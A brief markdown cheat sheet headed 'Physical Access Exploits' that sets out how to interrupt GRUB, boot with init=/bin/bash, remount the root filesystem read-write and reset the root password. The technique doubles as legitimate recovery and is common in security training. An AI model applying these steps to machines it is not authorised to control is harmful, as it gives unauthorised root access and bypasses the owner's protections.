# Physical Access Exploits

## GRUB Boot "Maintenance Mode"

1) Enter GRUB menu press "e" on keyboard

2) Modify line that begins with "linux"
	- after 'ro "X"'
	- delete the rest, change ro to rw
	- append the following

```sh
init=/bin/bash
```

3) Press CTRL+X to save and boot

4) Mount the filesystem
```
mount -no remount,rw /
```

5) Set the root password
```
passwd [PASSWORD]
```
